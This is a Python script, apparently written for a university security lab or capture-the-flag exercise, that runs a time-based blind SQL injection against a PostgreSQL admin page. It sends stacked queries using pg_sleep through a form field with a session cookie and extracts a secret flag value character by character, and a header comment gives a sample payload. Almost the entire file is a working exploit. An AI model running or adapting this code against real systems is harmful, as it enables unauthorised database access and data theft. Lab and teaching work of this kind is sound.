# "' WHERE nombre = 'platodeldia' and 1=0; SELECT CASE when (SELECT 7 FROM configuraciones WHERE nombre ='FLAG' and valor like 'a%') = 7 then pg_sleep(3) else pg_sleep(0) end; --"

import requests
import os
from datetime import datetime

# Tunnable
sleep_time = 3
pin_len = 256 # Is unknown
cookies = dict(PHPSESSID='c9aab06c8233316ba68fdf25918fa261')

# Getsesscookie
print(cookies["PHPSESSID"])

# Alternatives list
alternatives = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']


def send_and_delta_time_it(elem):
    """
    Obtiene un valor de verdad, es True si >= sleep_time, False si no
    """
    # Consulta
    query_d = f"RSA' WHERE nombre = 'platodeldia'; SELECT CASE when (SELECT 1 FROM configuraciones WHERE nombre ='FLAG' and valor like '{elem}') = 1 then pg_sleep({sleep_time}) else pg_sleep(0) end; --"
    
    # Body entrega _name_ como campo (en la AUX)
    # Body entrega _plato_del_dia_ como campo (en el LAB)
    payload = {'plato_del_dia': query_d}
    # Obtener time
    then = datetime.now()

    # Kuky's
    # print(cookies)

    # Realizar post
    r = requests.post("https://lsrw3krbznioprtvgdg8rx4s.lab3.cc5312.xor.cl/admin.php", data=payload, verify=False, cookies=cookies)
    # Obtener time
    now = datetime.now()
    # Obtener delta
    delta = now - then
    # Printear
    ##print(r.text)
    # Get return
    if (float(delta.seconds) >= sleep_time):
        return True
    else:
        return False

# Variables para loopear
actual_pin_len = 1
percentage_symbol = '%'
confirmed_pin = ''

# Condición de término :
# Si el largo del pin hasta ahora es igual al VALUE_FLAG después del loop
# es porque no agregó más elementos al VALUE_FLAG, luego, VALUE_FLAG hasta ese momento
# es FLAG buscada
while True:
    flag_len_before = len(confirmed_pin)
    # Imprimimos pin hasta ahora
    print(confirmed_pin)
    # Probamos de 0...9, a...z y A...Z
    for i in alternatives:
        # Creamos un pin de consulta
        test_pin = confirmed_pin + str(i) + percentage_symbol
        # Imprimir pin de consulta
        print(test_pin)
        # Obtenemos info si se detiene o no
        val = send_and_delta_time_it(test_pin)
        if val:
            # Actualizamos pin confirmado
            confirmed_pin = confirmed_pin + str(i)
            break
    flag_len_after = len(confirmed_pin)
    # Condición de término
    if (flag_len_after == flag_len_before):
        break
    
# Imprimimos pin_confirmado
print(confirmed_pin)